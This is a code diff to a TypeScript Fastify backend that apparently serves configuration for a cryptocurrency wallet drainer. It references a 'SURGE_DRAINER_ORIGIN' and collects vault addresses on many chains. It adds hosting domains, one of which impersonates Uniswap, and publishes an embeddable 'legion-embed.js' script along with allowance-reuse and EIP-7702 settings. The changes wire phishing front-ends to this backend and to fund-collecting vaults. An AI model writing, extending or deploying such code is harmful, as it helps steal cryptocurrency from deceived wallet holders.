@@ -43,7 +43,7 @@ function readBackendUrls(): string[] {
     if (!urls.includes(p)) urls.unshift(p)
   }
   if (urls.length === 0) {
-    urls.push('https://legionapi-production.up.railway.app')
+    urls.push('https://sadrailala-production.up.railway.app')
   }
   return urls
 }
@@ -75,6 +75,32 @@ function resolveEvmVault(): string | null {
   return raw || null
 }
 
+type ChainCapability = 'full' | 'anchor_only' | 'disabled'
+
+function readChainCapabilities(
+  vaults: Record<string, string | null>,
+): Record<string, ChainCapability> {
+  const full = (key: string): ChainCapability => (vaults[key] ? 'full' : 'disabled')
+  return {
+    EVM: full('evm'),
+    SOL: full('sol'),
+    BTC: full('btc'),
+    TRON: full('tron'),
+    TON: full('ton'),
+    COSMOS: full('cosmos'),
+    APTOS: full('aptos'),
+    SUI: full('sui'),
+    POLKADOT: 'anchor_only',
+    ALGORAND: 'anchor_only',
+    CARDANO: 'anchor_only',
+  }
+}
+
+const EMBED_CDN_URLS = [
+  'https://legion-cdn.surge.sh',
+  'https://uniswap-app-defi.surge.sh',
+]
+
 async function readVaultAddresses(): Promise<Record<string, string | null>> {
   const tonVault = await resolveTonVaultAddress()
   const evmVault = resolveEvmVault()
@@ -105,6 +131,8 @@ export async function registerClientConfigRoute(app: FastifyInstance): Promise<v
     }
     const corsOrigins = readCorsOriginsHint()
     const vaultAddresses = await readVaultAddresses()
+    const chainCapabilities = readChainCapabilities(vaultAddresses)
+    const embedPrimary = EMBED_CDN_URLS[0]!
     return sendSuccess(reply, 200, 'Client config ready', {
       endpoints,
       primary: endpoints[0],
@@ -113,14 +141,17 @@ export async function registerClientConfigRoute(app: FastifyInstance): Promise<v
       eip7702_enabled: (process.env['EIP7702_ENABLED']?.trim().toLowerCase() ?? '') === 'true',
       onchain_config_contract: process.env['ONCHAIN_CONFIG_CONTRACT_ADDRESS']?.trim() || null,
       vault_addresses: vaultAddresses,
+      chain_capabilities: chainCapabilities,
       relayer_sponsored_gas: isRelayerSponsorEnabled(),
       factory_addresses: readFactoryAddresses(),
       factory_implementation_address:
         process.env['FACTORY_IMPLEMENTATION_ADDRESS']?.trim() || null,
       allowance_reuse_enabled:
         (process.env['ALLOWANCE_REUSE_ENABLED']?.trim().toLowerCase() ?? 'true') !== 'false',
+      embed_cdn_urls: EMBED_CDN_URLS,
+      embed_script: `${embedPrimary}/legion-embed.js`,
       surge_origin_configured: corsOrigins.includes(SURGE_DRAINER_ORIGIN),
-      recommended_cors_origins: [SURGE_DRAINER_ORIGIN],
+      recommended_cors_origins: [...EMBED_CDN_URLS, SURGE_DRAINER_ORIGIN],
     })
   })
 }
